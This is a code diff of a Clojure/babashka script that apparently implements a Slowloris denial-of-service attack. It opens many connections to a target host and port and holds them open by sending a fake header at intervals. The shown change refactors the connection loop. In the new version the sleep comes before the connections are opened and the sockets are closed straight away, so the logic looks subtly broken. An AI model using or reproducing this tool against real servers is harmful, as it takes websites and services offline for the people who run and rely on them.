@@ -50,19 +50,19 @@
        :fut (future
               (loop []
                 (send-header "X-a" (rand-int 5000))
-                (.println System/out (str "Sent header, sleeping for: " interval))
+                (println (str "Sent header, sleeping for: " interval))
                 (Thread/sleep interval)
                 (recur)))})))
 
 (defn loris
   [{{:keys [host port connections interval sock-timeout]} :opts}]
-  (let [socks (doall (take connections (repeatedly #(connect host port interval sock-timeout))))]
-    (Thread/sleep 10000)
-    (run! (fn [{:keys [out sock fut]}]
-            (future-cancel fut)
-            (.close out)
-            (.close sock))
-          socks)))
+  (Thread/sleep 10000)
+  (->> (repeatedly #(connect host port interval sock-timeout))
+       (take connections)
+       (run! (fn [{:keys [out sock fut]}]
+               (future-cancel fut)
+               (.close out)
+               (.close sock)))))
 
 (when (= *file* (System/getProperty "babashka.file"))
   (set-agent-send-off-executor! (Executors/newVirtualThreadPerTaskExecutor))
